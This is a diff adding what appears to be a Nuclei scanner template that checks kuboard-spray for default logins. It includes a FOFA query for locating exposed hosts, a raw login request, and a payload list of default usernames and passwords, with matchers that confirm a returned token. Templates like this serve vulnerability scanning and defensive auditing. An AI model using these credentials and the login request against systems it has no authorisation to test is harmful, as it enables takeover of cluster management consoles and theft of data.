@@ -1,0 +1,48 @@
+id: kuboard-spray-default-login
+info:
+  name: kuboard-spray default login
+  author: leadlife
+  severity: high
+  description: kuboard-spray 存在默认账户密码弱口令，攻击者可直接登录系统后台，接管数据业务功能，获取敏感信息
+  reference: 
+    - https://kuboard.cn/install/v3/install.html#kuboard-v3-x-%E7%89%88%E6%9C%AC%E8%AF%B4%E6%98%8E
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="111613301" || icon_hash="692218720"
+  tags: kuboard,default-login
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 44
+        Authorization: Bearer undefined
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh,ja;q=0.9
+        Cookie: _ga=GA1.1.644799900.1743240370; _ga_0D2X8HMY8R=GS1.1.1743240370.1.0.1743240370.0.0.0
+        Connection: keep-alive
+
+        {"username":"{{username}}","password":"{{password}}"}
+    
+    attack: clusterbomb
+    payloads:
+      username:
+        - "admin"
+        - "demo"
+      password:
+        - "Kuboard123"
+        - "demo123"
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'success','data','token')
+        condition: and
